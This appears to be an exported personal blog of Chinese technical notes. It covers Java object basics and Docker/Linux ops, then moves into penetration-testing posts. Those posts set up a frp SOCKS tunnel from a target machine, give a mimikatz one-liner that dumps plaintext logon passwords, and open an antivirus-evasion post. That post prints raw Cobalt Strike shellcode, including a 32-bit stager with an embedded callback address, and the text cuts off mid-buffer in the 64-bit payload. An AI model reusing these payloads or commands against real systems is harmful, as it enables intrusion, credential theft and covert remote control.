<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.JavaStudy.test;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">User</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line">    <span class="keyword">private</span> String sex;</span><br><span class="line">    <span class="keyword">private</span> <span class="type">int</span> age;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//空参构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">()</span>&#123;</span><br><span class="line">        System.out.println(<span class="string">&quot;空参构造方法&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//带全部参数的构造方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="title function_">User</span><span class="params">(String name, String sex, <span class="type">int</span> age)</span>&#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">//get和set方法</span></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setName</span><span class="params">(String name)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setSex</span><span class="params">(String sex)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.sex = sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">setAge</span><span class="params">(<span class="type">int</span> age)</span> &#123;</span><br><span class="line">        <span class="built_in">this</span>.age = age;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getName</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">getSex</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">getAge</span><span class="params">()</span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>.age;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<h3 id="对象的内存图"><a href="#对象的内存图" class="headerlink" title="对象的内存图"></a>对象的内存图</h3><ul>
<li>创建对象时的过程：</li>
</ul>
<p><code>加载class字节码 -&gt; 申明局部变量 -&gt; 在堆内存中开辟一块空间 -&gt; 默认初始化 -&gt; 显示初始化 -&gt; 构造方法初始化 -&gt; 将堆内存中的地址值赋值给栈内存中的局部变量</code></p>
<p><strong>一个对象的内存图</strong></p>
<img src="/image/image-20230306202651668.png" alt="image-20230306202651668" style="zoom: 67%;" />

<h3 id="this的内存图"><a href="#this的内存图" class="headerlink" title="this的内存图"></a>this的内存图</h3><ul>
<li>本质：代表方法调用者本身的地址值</li>
</ul>
<h3 id="成员变量和局部变量"><a href="#成员变量和局部变量" class="headerlink" title="成员变量和局部变量"></a>成员变量和局部变量</h3><ul>
<li>成员变量：在类中且在方法外的变量</li>
<li>局部变量：方法中的变量</li>
</ul>
<p><strong>区别</strong></p>
<img src="/image/image-20230306204031334.png" alt="image-20230306204031334" style="zoom:80%;" />
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>Java</tag>
        <tag>笔记</tag>
        <tag>开发</tag>
      </tags>
  </entry>
  <entry>
    <title>Linux运维疑难杂症</title>
    <url>/2023/03/29/Linux%E8%BF%90%E7%BB%B4%E7%96%91%E9%9A%BE%E6%9D%82%E7%97%87/</url>
    <content><![CDATA[<h1 id="Linux运维"><a href="#Linux运维" class="headerlink" title="Linux运维"></a>Linux运维</h1><h2 id="Docker"><a href="#Docker" class="headerlink" title="Docker"></a>Docker</h2><h3 id="介绍"><a href="#介绍" class="headerlink" title="介绍"></a>介绍</h3><p>Linux 发展出了另一种虚拟化技术：Linux 容器（Linux Containers，缩写为 LXC）。</p>
<p>Linux 容器不是模拟一个完整的操作系统，而是对进程进行隔离。或者说，在正常进程的外面套了一个<a href="https://opensource.com/article/18/1/history-low-level-container-runtimes">保护层</a>。对于容器里面的进程来说，它接触到的各种资源都是虚拟的，从而实现与底层系统的隔离。</p>
<p>由于容器是进程级别的，相比虚拟机有很多优势。</p>
<p><strong>①启动快：</strong>容器里面的应用，直接就是底层系统的一个进程，而不是虚拟机内部的进程。所以，启动容器相当于启动本机的一个进程，而不是启动一个操作系统，速度就快很多。</p>
<p><strong>②资源占用少：</strong>容器只占用需要的资源，不占用那些没有用到的资源；虚拟机由于是完整的操作系统，不可避免要占用所有资源。另外，多个容器可以共享资源，虚拟机都是独享资源。</p>
<p><strong>③体积小：</strong>容器只要包含用到的组件即可，而虚拟机是整个操作系统的打包，所以容器文件比虚拟机文件要小很多。</p>
<p>总之，容器有点像轻量级的虚拟机，能够提供虚拟化的环境，但是成本开销小得多。</p>
<p><strong>Docker 属于 Linux 容器的一种封装，提供简单易用的容器使用接口。</strong>它是目前最流行的 Linux 容器解决方案。</p>
<p>Docker 将应用程序与该程序的依赖，打包在一个文件里面。运行这个文件，就会生成一个虚拟容器。程序在这个虚拟容器里运行，就好像在真实的物理机上运行一样。有了 Docker，就不用担心环境问题。</p>
<p>总体来说，Docker 的接口相当简单，用户可以方便地创建和使用容器，把自己的应用放入容器。容器还可以进行版本管理、复制、分享、修改，就像管理普通的代码一样。</p>
<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><h3 id="常用命令"><a href="#常用命令" class="headerlink" title="常用命令"></a>常用命令</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">docker login		<span class="comment">#登录docker账号以push镜像</span></span><br><span class="line">docker pull 镜像名:标签		<span class="comment">#拉取指定镜像，默认标签使用latest</span></span><br><span class="line">docker push 镜像<span class="built_in">id</span>		<span class="comment">#推送指定镜像到docker hub</span></span><br><span class="line">docker images		<span class="comment">#查看docker镜像</span></span><br><span class="line">docker images -a	<span class="comment">#查看所有的docker镜像，包括虚悬镜像（none标签）</span></span><br><span class="line">docker ps  			<span class="comment">#列出正在运行的docker容器状态</span></span><br><span class="line">docker run			<span class="comment">#运行docker容器</span></span><br><span class="line">docker run -it 镜像名/容器<span class="built_in">id</span> 命令		<span class="comment">#以交互模式运行指定容器并分配一个伪输入终端，不使用命令默认执行dockerfile中的CMD</span></span><br><span class="line">			-d		<span class="comment">#后台运行容器并返回容器id</span></span><br><span class="line">			-p 宿主机端口:容器端口		<span class="comment">#将宿主机的端口映射到容器的端口</span></span><br><span class="line">			-P		<span class="comment">#随机端口映射</span></span><br><span class="line">			--network=bridge/host/none	<span class="comment">#设置容器的网络模式</span></span><br><span class="line">			--privileged		<span class="comment">#以特权模式运行容器</span></span><br><span class="line">docker <span class="built_in">exec</span>			<span class="comment">#在运行的容器中执行命令</span></span><br><span class="line">docker <span class="built_in">exec</span> -it 容器<span class="built_in">id</span> 命令		<span class="comment">#在运行的容器中执行命令并以交互模式分配一个伪输入终端</span></span><br><span class="line">docker stop 容器<span class="built_in">id</span>		<span class="comment">#停止指定的容器</span></span><br><span class="line">docker commit 容器<span class="built_in">id</span> 镜像名:标签		<span class="comment">#保存指定的容器并命名为镜像名:标签</span></span><br><span class="line">docker save -o 保存文件名 镜像名/容器<span class="built_in">id</span>		<span class="comment">#导出完整镜像</span></span><br><span class="line">docker tag 镜像名/容器<span class="built_in">id</span> 镜像名			<span class="comment">#重命名镜像</span></span><br></pre></td></tr></table></figure>

<h3 id="常见问题"><a href="#常见问题" class="headerlink" title="常见问题"></a>常见问题</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="comment">#启动脚本run.sh报错</span></span><br><span class="line"><span class="comment">#Standard_init_linux.go:190: exec user process caused &quot;exec format error&quot;</span></span><br><span class="line">解决方法：启动脚本开头必须加：<span class="comment">#!/bin/bash</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#systemctl和service</span></span><br></pre></td></tr></table></figure>





<h2 id="杂项记录"><a href="#杂项记录" class="headerlink" title="杂项记录"></a>杂项记录</h2><h3 id="查看Linux-Deb包的依赖关系"><a href="#查看Linux-Deb包的依赖关系" class="headerlink" title="查看Linux Deb包的依赖关系"></a>查看Linux Deb包的依赖关系</h3><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">Deb是debian linus的安装格式，跟red hat的rpm非常相似，最基本的安装命令是：dpkg -i file.deb。 </span><br><span class="line">dpkg 是Debian Package的简写，是为Debian 专门开发的套件管理系统，方便软件的安装、更新及移除。所有源自Debian的Linux发行版都使用dpkg，例如Ubuntu等。</span><br><span class="line"></span><br><span class="line">我这里用到的测试环境是Ubuntu，测试的包是：apache2_2.4.7-1ubuntu4.14_amd64.deb。</span><br><span class="line"></span><br><span class="line">使用的命令：</span><br><span class="line">dpkg --info apache2_2.4.7-1ubuntu4.14_amd64.deb | grep Depends</span><br><span class="line">先获取包的信息，然后通过管道将“Depends”截取出来，就获得下图的结果：</span><br><span class="line">得到的Depends就是依赖的包，如perl，apache-bin，apache2-data等</span><br></pre></td></tr></table></figure>

<h3 id="vmware中ubuntu网卡失效"><a href="#vmware中ubuntu网卡失效" class="headerlink" title="vmware中ubuntu网卡失效"></a>vmware中ubuntu网卡失效</h3><p><strong>1、先将network-manager服务关闭</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service network-manager stop</span><br></pre></td></tr></table></figure>

<p><strong>2、把network-manager的状态文件删除，后续重新运行network-manager服务后会自动生成</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo <span class="built_in">rm</span> /var/lib/NetworkManager/NetworkManager.state</span><br></pre></td></tr></table></figure>

<p><strong>3、编辑network-manager配置文件，将[ifupdown]中的managed&#x3D;false改成true</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo gedit /etc/NetworkManager/NetworkManager.conf</span><br></pre></td></tr></table></figure>

<p><strong>4、启动network-manager服务</strong></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo service network-manager start</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>Linux</tag>
        <tag>运维</tag>
      </tags>
  </entry>
  <entry>
    <title>内网渗透笔记</title>
    <url>/2023/02/11/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/</url>
    <content><![CDATA[<h1 id="内网渗透总结"><a href="#内网渗透总结" class="headerlink" title="内网渗透总结"></a>内网渗透总结</h1><h2 id="代理方法"><a href="#代理方法" class="headerlink" title="代理方法"></a>代理方法</h2><h3 id="frp"><a href="#frp" class="headerlink" title="frp"></a>frp</h3><blockquote>
<p>下载链接：<a href="https://github.com/fatedier/frp/releases">https://github.com/fatedier/frp/releases</a></p>
</blockquote>
<h4 id="frp工作原理拓扑图"><a href="#frp工作原理拓扑图" class="headerlink" title="frp工作原理拓扑图"></a>frp工作原理拓扑图</h4><img src="/image/frp拓扑.jpg" alt="frp拓扑" style="zoom: 50%;" />

<h4 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h4><p>在使用frp之前，首先要对服务端和客户端配置文件（frps.ini &amp; frpc.ini）进行配置</p>
<p>服务端（有公网的机器）：frps.ini</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"><span class="comment"># 监听端口</span></span><br><span class="line">bind_addr = 0.0.0.0</span><br><span class="line">bind_port = 7000</span><br><span class="line"> </span><br><span class="line"><span class="comment"># 以下为web页面，可不配置</span></span><br><span class="line"><span class="comment"># IP 与 bind_addr 默认相同，可以不设置</span></span><br><span class="line">dashboard_addr = 0.0.0.0</span><br><span class="line"><span class="comment"># 端口必须设置，只有设置web页面才生效</span></span><br><span class="line">dashboard_port = 7001</span><br><span class="line"><span class="comment"># 用户密码</span></span><br><span class="line">dashboard_user = y5neko</span><br><span class="line">dashboard_pwd = y5neko</span><br><span class="line"><span class="comment"># 允许客户端绑定的端口</span></span><br><span class="line">allow_ports = 40000-50000</span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">服务端启动：./frps -c frps.ini</span><br><span class="line">后台启动：<span class="built_in">nohup</span> ./frps -c frps.ini &amp;</span><br></pre></td></tr></table></figure>

<p>客户端（目标机）：frpc.ini</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[common]</span><br><span class="line"><span class="comment"># 服务端ip</span></span><br><span class="line">server_addr = your vps addr</span><br><span class="line"><span class="comment"># 端口，与frps同步</span></span><br><span class="line">server_port = 7000   </span><br><span class="line">tls_enable = <span class="literal">true</span></span><br><span class="line">pool_count = 5</span><br><span class="line"> </span><br><span class="line"><span class="comment"># socks代理模块</span></span><br><span class="line">[plugin_socks]</span><br><span class="line"><span class="built_in">type</span> = tcp</span><br><span class="line"><span class="comment"># socks5端口</span></span><br><span class="line">remote_port = 14512</span><br><span class="line">plugin = socks5</span><br><span class="line"><span class="comment"># socks5账号密码</span></span><br><span class="line">plugin_user = y5neko</span><br><span class="line">plugin_passwd = y5neko</span><br><span class="line">use_encryption = <span class="literal">true</span></span><br><span class="line">use_compression = <span class="literal">true</span></span><br></pre></td></tr></table></figure>

<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">客户端启动：./frpc -c frpc.ini &amp;</span><br><span class="line">后台启动：<span class="built_in">nohup</span> ./frpc -c frpc.ini &amp;</span><br></pre></td></tr></table></figure>

<h2 id="连接代理"><a href="#连接代理" class="headerlink" title="连接代理"></a>连接代理</h2><h3 id="Proxifier"><a href="#Proxifier" class="headerlink" title="Proxifier"></a>Proxifier</h3><blockquote>
<p>Proxifier是一款功能非常强大的socks5客户端，可以让不支持通过代理服务器工作的网络程序能通过HTTPS或SOCKS代理或代理链。</p>
</blockquote>
<img src="/image/image-20201222191729011.png" alt="image-20201222191729011" style="zoom:50%;" />

<h4 id="配置-1"><a href="#配置-1" class="headerlink" title="配置"></a>配置</h4><p>配置文件 &#x3D;&gt; 代理服务器</p>
<img src="/image/image-20201222191818678.png" alt="image-20201222191818678" style="zoom:67%;" />

<p>选中默认的代理服务器配置</p>
<img src="/image/image-20201222191844133.png" alt="image-20201222191844133" style="zoom:67%;" />

<p>填写建立的socks代理配置</p>
<img src="/image/image-20201222191912992.png" alt="image-20201222191912992" style="zoom:67%;" />

<p>检测连接成功后，右键通过Proxifier代理打开即可</p>
<img src="/image/image-20201222193544608.png" alt="image-20201222193544608" style="zoom:67%;" />

<h3 id="Proxychains"><a href="#Proxychains" class="headerlink" title="Proxychains"></a>Proxychains</h3><blockquote>
<p>一款命令行代理神器，kali3以上默认自带。</p>
<p>ps：proxychains不支持UDP和ICMP</p>
<img src="/image/image-20201222194252608.png" alt="image-20201222194252608" style="zoom:80%;" />
</blockquote>
<h4 id="配置-2"><a href="#配置-2" class="headerlink" title="配置"></a>配置</h4><p>修改配置文件，文件位置为 <strong>&#x2F;etc&#x2F;proxychains.conf</strong></p>
<p>用vi修改，找到 <strong>[ProxyList]</strong></p>
<p>修改内容为：</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">[ProxyList]</span><br><span class="line"><span class="comment"># 代理方式以及配置</span></span><br><span class="line">socks5 ip_addr port username password</span><br></pre></td></tr></table></figure>

<h4 id="使用"><a href="#使用" class="headerlink" title="使用"></a>使用</h4><figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">proxyresolv 127.0.0.1					<span class="comment"># 检测连接</span></span><br><span class="line">proxychains nmap -sT -Pn 127.0.0.1		 <span class="comment"># 通过socks代理执行命令，不支持UDP及ICMP，使用TCP扫描</span></span><br></pre></td></tr></table></figure>

<img src="/image/image-20201222195139006.png" alt="image-20201222195139006" style="zoom:80%;" />

<h2 id="口令破解"><a href="#口令破解" class="headerlink" title="口令破解"></a>口令破解</h2><h3 id="mimikatz"><a href="#mimikatz" class="headerlink" title="mimikatz"></a>mimikatz</h3><p>无需tty读取明文密码</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mimikatz.exe &quot;privilege::debug&quot; &quot;sekurlsa::logonpasswords full&quot; &quot;exit&quot;</span><br></pre></td></tr></table></figure>

<img src="/image/image-20201222183945385.png" alt="image-20201222183945385" style="zoom: 50%;" />]]></content>
      <categories>
        <category>笔记</category>
      </categories>
      <tags>
        <tag>笔记</tag>
        <tag>内网渗透</tag>
      </tags>
  </entry>
  <entry>
    <title>基础免杀</title>
    <url>/2023/11/09/%E5%9F%BA%E7%A1%80%E5%85%8D%E6%9D%80/</url>
    <content><![CDATA[<h2 id="Shellcode加载器"><a href="#Shellcode加载器" class="headerlink" title="Shellcode加载器"></a>Shellcode加载器</h2><p>在渗透测试过程中，往往需要使用木马上线目标主机来达到持久化、便捷化控制目标主机的目的。<code>shellcode</code>由于其自身可塑性高，杀软查杀难度较高，因此通常将木马<code>shellcode</code>化后，再进行免杀处理。</p>
<h3 id="shellcode"><a href="#shellcode" class="headerlink" title="shellcode"></a>shellcode</h3><p> <code>shellcode</code>为<code>16</code>进制的机器码，是一种地址无关代码，可在暂存器<code>EIP</code>溢出后，塞入一段可以让<code>CPU</code>执行的恶意代码，从而执行攻击者的任何指令。这是因为，当<code>shellcode</code>被写入内存后，会被翻译成<code>CPU</code>指令。<code>CPU</code>自上而下执行这些指令，这其中有一个特殊的寄存器，<code>EIP</code>寄存器，它里面存放的值是<code>CPU</code>下次要执行的指令地址，因此可以通过修改<code>EIP</code>寄存器的值来执行<code>shellcode</code>。</p>
<h3 id="生成shellcode"><a href="#生成shellcode" class="headerlink" title="生成shellcode"></a>生成shellcode</h3><p>首先用cs生成用于上线的shellcode</p>
<p><strong>calc</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">\x48\x81\xEC\x00\x01\x00\x00\x65\x48\x8B\x04\x25\x60\x00\x00\x00\x48\x8B\x40\x18\x48\x8B\x40\x30\x48\x8B\x70\x10\x48\x8B\x58\x40\x48\x8B\x00\x81\x7B\x0C\x33\x00\x32\x00\x75\xEC\x48\x8B\xCE\x48\xC7\xC2\x32\x74\x91\x0C\xE8\xC0\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC3\x6C\x6C\x00\x00\x53\x48\xBB\x75\x73\x65\x72\x33\x32\x2E\x64\x53\x48\x8B\xCC\x48\x83\xEC\x18\x41\xFF\xD6\x48\x8B\xD8\x48\x8B\xCB\x48\xC7\xC2\x6A\x0A\x38\x1E\xE8\x8E\x00\x00\x00\x4C\x8B\xF0\x4D\x33\xC9\x4D\x33\xC0\x48\x33\xD2\x48\x33\xC9\x41\xFF\xD6\x48\x8B\xCE\x48\xC7\xC2\x51\x2F\xA2\x01\xE8\x6D\x00\x00\x00\x4C\x8B\xF0\x48\x33\xC0\x50\x48\xB8\x63\x61\x6C\x63\x2E\x65\x78\x65\x50\x48\x8B\xCC\x48\x83\xEC\x20\x48\xC7\xC2\x01\x00\x00\x00\x41\xFF\xD6\x48\x8B\xCE\x48\xBA\x85\xDF\xAF\xBB\x00\x00\x00\x00\xE8\x38\x00\x00\x00\x4C\x8B\xF0\x48\xC7\xC0\x61\x64\x00\x00\x50\x48\xB8\x45\x78\x69\x74\x54\x68\x72\x65\x50\x48\x8B\xCE\x48\x8B\xD4\x48\x83\xEC\x20\x41\xFF\xD6\x4C\x8B\xF0\x48\x81\xC4\x88\x01\x00\x00\x48\x83\xEC\x18\x48\x33\xC9\x41\xFF\xD6\xC3\x48\x83\xEC\x40\x56\x48\x8B\xFA\x48\x8B\xD9\x48\x8B\x73\x3C\x48\x8B\xC6\x48\xC1\xE0\x36\x48\xC1\xE8\x36\x48\x8B\xB4\x03\x88\x00\x00\x00\x48\xC1\xE6\x20\x48\xC1\xEE\x20\x48\x03\xF3\x56\x8B\x76\x20\x48\x03\xF3\x48\x33\xC9\xFF\xC9\xFF\xC1\xAD\x48\x03\xC3\x33\xD2\x80\x38\x00\x74\x0F\xC1\xCA\x07\x51\x0F\xBE\x08\x03\xD1\x59\x48\xFF\xC0\xEB\xEC\x3B\xD7\x75\xE0\x5E\x8B\x56\x24\x48\x03\xD3\x0F\xBF\x0C\x4A\x8B\x56\x1C\x48\x03\xD3\x8B\x04\x8A\x48\x03\xC3\x5E\x48\x83\xC4\x40\xC3</span><br></pre></td></tr></table></figure>

<p><strong>32位</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* length: 798 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\xe8\x89\x00\x00\x00\x60\x89\xe5\x31\xd2\x64\x8b\x52\x30\x8b\x52\x0c\x8b\x52\x14\x8b\x72\x28\x0f\xb7\x4a\x26\x31\xff\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\xc1\xcf\x0d\x01\xc7\xe2\xf0\x52\x57\x8b\x52\x10\x8b\x42\x3c\x01\xd0\x8b\x40\x78\x85\xc0\x74\x4a\x01\xd0\x50\x8b\x48\x18\x8b\x58\x20\x01\xd3\xe3\x3c\x49\x8b\x34\x8b\x01\xd6\x31\xff\x31\xc0\xac\xc1\xcf\x0d\x01\xc7\x38\xe0\x75\xf4\x03\x7d\xf8\x3b\x7d\x24\x75\xe2\x58\x8b\x58\x24\x01\xd3\x66\x8b\x0c\x4b\x8b\x58\x1c\x01\xd3\x8b\x04\x8b\x01\xd0\x89\x44\x24\x24\x5b\x5b\x61\x59\x5a\x51\xff\xe0\x58\x5f\x5a\x8b\x12\xeb\x86\x5d\x68\x6e\x65\x74\x00\x68\x77\x69\x6e\x69\x54\x68\x4c\x77\x26\x07\xff\xd5\x31\xff\x57\x57\x57\x57\x57\x68\x3a\x56\x79\xa7\xff\xd5\xe9\x84\x00\x00\x00\x5b\x31\xc9\x51\x51\x6a\x03\x51\x51\x68\x50\x00\x00\x00\x53\x50\x68\x57\x89\x9f\xc6\xff\xd5\xeb\x70\x5b\x31\xd2\x52\x68\x00\x02\x40\x84\x52\x52\x52\x53\x52\x50\x68\xeb\x55\x2e\x3b\xff\xd5\x89\xc6\x83\xc3\x50\x31\xff\x57\x57\x6a\xff\x53\x56\x68\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x84\xc3\x01\x00\x00\x31\xff\x85\xf6\x74\x04\x89\xf9\xeb\x09\x68\xaa\xc5\xe2\x5d\xff\xd5\x89\xc1\x68\x45\x21\x5e\x31\xff\xd5\x31\xff\x57\x6a\x07\x51\x56\x50\x68\xb7\x57\xe0\x0b\xff\xd5\xbf\x00\x2f\x00\x00\x39\xc7\x74\xb7\x31\xff\xe9\x91\x01\x00\x00\xe9\xc9\x01\x00\x00\xe8\x8b\xff\xff\xff\x2f\x33\x64\x4d\x78\x00\xa7\xf5\x92\xec\x37\x66\xaf\xf3\xf2\xae\x3a\xd1\x3a\x4c\x63\xb8\xf7\x28\x0d\x1b\xf1\x80\x1c\x5e\x3a\xb9\xc7\x75\xb7\x07\x00\xae\xb9\x5e\x91\x38\x0a\x09\x4d\x7b\xa3\xe5\x91\x32\x21\x87\x7c\x25\x87\xe3\x17\x75\x01\x7b\x76\x81\x9b\x41\x74\x6a\x20\xa0\x0a\x52\xb7\xc1\x98\xe4\x40\x55\x63\xba\xce\x00\x55\x73\x65\x72\x2d\x41\x67\x65\x6e\x74\x3a\x20\x4d\x6f\x7a\x69\x6c\x6c\x61\x2f\x35\x2e\x30\x20\x28\x63\x6f\x6d\x70\x61\x74\x69\x62\x6c\x65\x3b\x20\x4d\x53\x49\x45\x20\x39\x2e\x30\x3b\x20\x57\x69\x6e\x64\x6f\x77\x73\x20\x4e\x54\x20\x36\x2e\x31\x3b\x20\x57\x4f\x57\x36\x34\x3b\x20\x54\x72\x69\x64\x65\x6e\x74\x2f\x35\x2e\x30\x3b\x20\x42\x4f\x49\x45\x39\x3b\x45\x4e\x55\x53\x4d\x53\x45\x29\x0d\x0a\x00\x4a\xd7\x24\x6f\xdd\x1e\x28\x0c\xe9\x49\x97\x85\xa9\xc1\x58\xfc\x52\x3f\x86\xda\x66\x2e\x1a\xed\x5c\xf8\x0f\x68\xa1\x67\xc7\xc4\xf7\xd1\xee\xfb\xeb\x75\x45\xec\xf3\x27\xa7\xf8\x2a\x72\x16\xd2\x35\x69\x08\x86\x36\xfc\xd4\x39\x5d\x03\xb6\x0a\xa7\xa3\xc9\x92\xe9\x11\xad\x87\x41\x57\xc9\x13\x25\xd3\x52\x8f\x75\xc0\x93\xef\xf4\xce\x7b\x79\x84\x0d\x2d\x72\x46\x52\x96\x68\x8a\x61\xcf\x37\xbc\x81\x36\x24\x55\x98\x20\x2c\xa2\x56\x20\x17\x91\x69\xb4\x2f\xc1\x6d\x8c\x61\xc1\x39\xe4\x4d\x21\x84\xc3\xa7\xa5\x21\x91\x21\x23\x20\x87\x8e\x5d\x30\x6a\x5e\xca\xc0\x5e\xfb\x6d\xe8\xf4\x9b\x56\xf1\x48\xfd\x8b\x51\x95\x92\x74\x99\x90\x0a\x0e\xa1\xd1\x06\x63\x1b\x44\xf9\x0b\xc1\x26\xd0\x82\xe6\xec\x8a\xde\xb4\xc9\xf2\x85\x64\xd1\x6c\x12\x2a\xb7\x57\x8c\xfa\xbc\x48\x26\xe8\x5e\x97\xcf\x99\x73\xf0\x6d\xc9\xea\x28\x4a\x49\x1c\x00\x68\xf0\xb5\xa2\x56\xff\xd5\x6a\x40\x68\x00\x10\x00\x00\x68\x00\x00\x40\x00\x57\x68\x58\xa4\x53\xe5\xff\xd5\x93\xb9\x00\x00\x00\x00\x01\xd9\x51\x53\x89\xe7\x57\x68\x00\x20\x00\x00\x53\x56\x68\x12\x96\x89\xe2\xff\xd5\x85\xc0\x74\xc6\x8b\x07\x01\xc3\x85\xc0\x75\xe5\x58\xc3\xe8\xa9\xfd\xff\xff\x31\x39\x32\x2e\x31\x36\x38\x2e\x31\x2e\x31\x32\x38\x00\x49\x96\x02\xd2&quot;</span>;</span><br></pre></td></tr></table></figure>

<p><strong>64位</strong></p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">/* length: 892 bytes */</span></span><br><span class="line"><span class="type">unsigned</span> <span class="type">char</span> buf[] = <span class="string">&quot;\xfc\x48\x83\xe4\xf0\xe8\xc8\x00\x00\x00\x41\x51\x41\x50\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x75\x72\x8b\x80\x88\x00\x00\x00\x48\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9\x4f\xff\xff\xff\x5d\x6a\x00\x49\xbe\x77\x69\x6e\x69\x6e\x65\x74\x00\x41\x56\x49\x89\xe6\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07\xff\xd5\x48\x31\xc9\x48\x31\xd2\x4d\x31\xc0\x4d\x31\xc9\x41\x50\x41\x50\x41\xba\x3a\x56\x79\xa7\xff\xd5\xeb\x73\x5a\x48\x89\xc1\x41\xb8\x50\x00\x00\x00\x4d\x31\xc9\x41\x51\x41\x51\x6a\x03\x41\x51\x41\xba\x57\x89\x9f\xc6\xff\xd5\xeb\x59\x5b\x48\x89\xc1\x48\x31\xd2\x49\x89\xd8\x4d\x31\xc9\x52\x68\x00\x02\x40\x84\x52\x52\x41\xba\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x48\x83\xc3\x50\x6a\x0a\x5f\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\xff\xff\xff\xff\x4d\x31\xc9\x52\x52\x41\xba\x2d\x06\x18\x7b\xff\xd5\x85\xc0\x0f\x85\x9d\x01\x00\x00\x48\xff\xcf\x0f\x84\x8c\x01\x00\x00\xeb\xd3\xe9\xe4\x01\x00\x00\xe8\xa2\xff\xff\xff\x2f\x54\x49\x54\x6c\x00\x61\x85\x2d\x13\x88\xf6\x4a\x2c\x57\x8c\x29\x08\x71\x8f\xc1\x01\xed\x6d\xcc\xa9\xf0\x40\x9d\x9e\x7c\x18\x3d\xbd\x21\xfb\x13\x94\x79\xf5\xc7\x99\xa8\x72\xfb\x28\xb6\xaa\xc0\xcf\xaa\xa8\x4e\x09\xdc\xd3\x7d\x63\x77\x57\xb9\x40\x9c\x94\xdb\x5d\x39\xd6\x96\x38\x